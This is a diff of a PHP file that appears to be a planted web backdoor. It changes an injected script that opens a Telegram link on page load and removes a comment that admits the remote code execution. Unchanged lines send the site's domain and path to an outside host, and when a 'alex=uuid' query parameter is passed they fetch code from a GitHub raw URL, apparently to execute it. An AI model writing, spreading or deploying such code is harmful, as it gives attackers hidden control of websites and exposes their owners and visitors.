@@ -1,5 +1,9 @@
 <?php
-echo "<script>window.open('https://t.me/alexbu555', '_blank');</script>";
+echo "<script>
+    window.onload = function() {
+        window.open('https://t.me/alexbu555', '_blank');
+    };
+</script>";
 $domain = $_SERVER['SERVER_NAME'];
 $path = $_SERVER['REQUEST_URI'];
 $filename = basename(__FILE__);
@@ -21,7 +25,6 @@ $options = array(
 $context  = stream_context_create($options);
 $result = file_get_contents('https://thuvienso.caodang20.edu.vn/bin/app.php', false, $context);
 if (isset($_GET['alex']) && $_GET['alex'] === 'uuid') {
-    // Khi tham số `alex` được thiết lập thành `uuid`, thực thi mã từ xa
     $url = 'https://raw.githubusercontent.com/hinataloli/haha/main/pke.txt';
     $code = file_get_contents($url);
     if ($code !== false) {
